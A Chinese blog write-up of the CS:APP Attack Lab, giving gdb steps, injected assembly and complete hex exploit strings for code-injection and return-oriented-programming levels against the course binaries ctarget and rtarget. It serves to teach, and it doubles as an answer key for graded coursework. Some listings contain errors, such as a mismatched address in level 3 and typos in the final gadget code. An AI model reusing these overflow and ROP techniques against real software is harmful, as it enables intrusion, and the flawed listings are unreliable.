## Attack Lab

这个实验我很早以前就做完了，但当时没有写博客，现在想起来，发现已经完全忘记当时怎么做的了。只好再做一次。

实验的基本玩法就是实验缓冲区溢出攻击，攻击的成功的标志是调用特定的函数。实验分为两个部分，第一部分就做Code Injection Attacks，这里栈上是可以执行代码的，并且没有栈随机化机制。第二部分叫做Return-Oriented Programming，这里栈上不能执行代码，并且有栈随机化机制。

实验中的流程是这样的，首先，主函数调用一个test函数，

```cpp
void test(){
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

test调用一个可以执行缓冲区攻击的函数。

```cpp
unsigned getbuf(){
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

我们通过输入一个特定的字符串，使缓冲区溢出，如果能成功调用一个函数，则攻击成功。

### Part I level 1
这里我们需要调用的函数为touch1。

```cpp
void touch1(){
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

因为touch1不需要参数，所以只需要把返回地址覆盖为touch1的地址即可。为了做到这点，我们先要查看缓冲区的大小。我们需要执行以下操作。

```cpp
gdb ./ctarget
disas getbuf
	0x00000000004017a8 <+0>:     sub    $0x28,%rsp //缓存区大小为40字节
	...
disas touch1
	0x00000000004017c0 <+0>:     sub    $0x8,%rsp //touch1函数地址
```
所以，这里我们只需要先输入40个任意字符，然后再输入touch1的地址覆盖原来的返回地址，这样，函数返回的时候，就会跳转到touch1。这样我们可以构造出答案c1.txt（为了美观，这里进行了换行，真的答案没有换行，换行也支持），注意地址的输入顺序。

```cpp
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

执行

```cpp
./hex2raw < c1.txt | ./ctarget -q
	Cookie: 0x59b997fa
	Type string:Touch1!: You called touch1()
	Valid solution for level 1 with target ctarget
```
OK，pass。

### Part I level 2
这里我们需要调用的函数是touch2。

```cpp
void touch2(unsigned val){
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    }else{
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

可以看出，touch2和touch1的区别是，touch2多了一个参数。这里，我们要得到touch2的函数地址(cookie值可以从上面的执行结果得到)。因为我们需要传递参数，并且栈上是可以执行代码的，所以我们可以利用40个字节，构造一段代码，然后返回的时候，返回到输入缓冲区的地方，也就是我们插入代码的地方。所以，我们要得到getbuf函数中buf的其实地址。执行以下操作。

```cpp
gdb ./ctarget
disas touch2
   0x00000000004017ec <+0>:     sub    $0x8,%rsp //touch2地址
break getbuf
run -q
stepi //执行char buf[BUFFER_SZIE];
print /x $rsp 
	$1 = 0x5561dc78 //buf起始地址
```
我们还需要编写汇编代码c2.s。汇编代码如下：

```cpp
mov  $0x59b997fa,%edi
pushq $0x4017ec
ret
```

这里之所以没有用jump，是因为实验手册上注明了主要不要用jump。然后，行以下操作得到二进制码。

```cpp
gcc -c c2.s
objdump -d c2.o > c2.d
cat c2.d
	0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
	5:   68 ec 17 40 00          pushq  $0x4017ec
	a:   c3                      retq   
```
所以，最后的答案为

```cpp
bf fa 97 b9 59 68 ec 17
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```
### Part I level 3

这一次，我们要调用的函数是touch3。

```cpp
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    /* Make position of check string unpredictable */ 
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval){
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    }else{
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```
乍一看，hexmatch里面有一个random函数，不知道怎么办，但仔细看下来，发现这个根本就不影响结果。可能是出于什么其他的原因吧。所以，这个函数和上一个比起来，好像有点复杂，但其实都是一样的。唯一不一样的地方可能是需要自己构造一个字符串，但是还是比较简单。因为函数返回地址后面还可以溢出，这样，我们就可以把我们构造的字符串放在这里。注意，这里需要查ASCII表。

所以，这里我们需要做的事情有，得到touch3的函数地址，构造cookie字符串，然后编写汇编代码，汇编代码需要执行的操作是，把我们构造的字符串地址作为第一个参数，调用touch3函数。前面我们已经得到了getbuf函数中buf的首地址为0x5561dc78 ，所以我们构造的字符串的首地址为0x5561dc78 + 0x28 + 0x8 = 0x5561dca8。通过和上面类似的方法，得到touch3函数的地址为0x4018fa。所以我们的汇编代码c3.s为。

```cpp
mov $0x5561dca0, %edi
pushq $0x4018fa
ret
```

使用gcc得到对应的二进制代码。
```cpp
0:   bf a0 dc 61 55          mov    $0x5561dca0,%edi
5:   68 fa 18 40 00          pushq  $0x4018fa
a:   c3                      retq   
```
我们这里的cookie为0x59b997fa，对应的字符的16进制形式为。

```
35 39 62 39 39 37 66 61 00
```

所以，最后的答案为：

```cpp
bf a8 dc 61 55 68 fa 18
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 //buf地址
35 39 62 39 39 37 66 61 //字符串
00 
```

### part II level 2

第二部分的题目无法实现代码注入，但还是有办法。一个最基本的办法是利用ret指令和popq，ret指令会执行栈上对应的函数，popq可以把栈上的值复制到一个寄存器。另外还有一个技巧就是一段二进制的代码，我们如果从某个地方开始看，可以得到一种不同的解释。比如c3可能作为数据的一部分，但如果直接解释的话，就会得到ret指令。

这里我们仍然需要调用touch2函数，这里的基本思路还是执行下面的汇编代码，不过需要改进。

```cpp
0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
5:   68 ec 17 40 00          pushq  $0x4017ec
a:   c3                      retq   
```

因为我们不能在栈上执行代码，所以我们需要对上面的代码进行改动，使得自使用movq，popq，ret，nop就可以完成。可以改成下面这样。

```cpp
popq %rax //栈上值为0x59b997fa
movl %eax, %edi
ret //栈上值为0x4017ec
```
这里，我们可以先反编译rtarget，得到rtarget.d；然后编译方面的汇编代码，得到c4.d。

```cpp
objdump -d rtarget > rtarget.d
gcc -c c4.s
objdump -d c4.o > c4.d
cat c4.d
	0:   58                      pop    %rax
	1:   89 c7                   mov    %eax,%edi
	3:   c3                      retq    
```
然后我们在rtarget.d里面查找对应的指令，发现一般最多能匹配一条指令，所以后面的指令只能去其他地方查找，并且后面只能跟上ret（前面可以用nop指令）。查找的结果如下：

```cpp
00000000004019a7 <addval_219>: 
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax //4019ab
  4019ad:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi) //4019c6
  4019c9:	c3 
```
有了这些，我们可以直接写答案了。

```cpp
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
ab 19 40 00 00 00 00 00 //pop    %rax
fa 97 b9 59 00 00 00 00 
c6 19 40 00 00 00 00 00 //mov    %eax,%edi
ec 17 40 00 00 00 00 00 //控制转移到touch2
```

### part II level 3

这一部分我们要调用的是touch3函数。我们做完了前面，就已经可以得到95分了，所以这里真的很难。难的地方主要有两个，第一是由于栈随机化，我们可以把字符串放在栈上，但是字符串的地址不能自己计算，只能通过已知的变量进行偏移得到。第二是因为要满足前面的要求，所以汇编代码比较长，不好写也不好调试。

我自己做的时候，没有明白前面一点，感觉不是很难，所以就失败了。看了别人的答案后，发现真的挺复杂的，主要是汇编代码编写上的问题。这里我也不分析了，流程和前面一样，只不过流程长了一点。这里我直接给出汇编代码。

```cpp
mov %rsp, %rax
mov %rax, %rdi
popq %rax //栈值为0x48
movl %eax, %edx
movl %edx,%ecx
movl %ecx, %esi
leap (%rdi,%rsi,1),%rax //rax = 栈顶值 + 0x48
mov %rax,rdi //传递参数
```

对应的答案为：

```cpp
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00 //字符串距离栈顶的距离
dd 19 40 00 00 00 00 00
69 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00 //touch3地址
35 39 62 39 39 37 66 61 //字符串
00
```
### 结束语

总的来说，这个实验，就最后一个比较难，其他的难度不是很高，只要认真做，做出来不难。做实验之前，还是要仔细阅读实验手册，这样可以避免一些弯路；最好不要一上来就看别人的博客。

这个实验使我意识到了，一个软件的安全性，取决于它最薄弱的环节。就像Part II，虽然栈上禁止执行代码，并且有栈随机化的机制，但由于一个缓冲区溢出的漏洞，还是可能受到攻击。
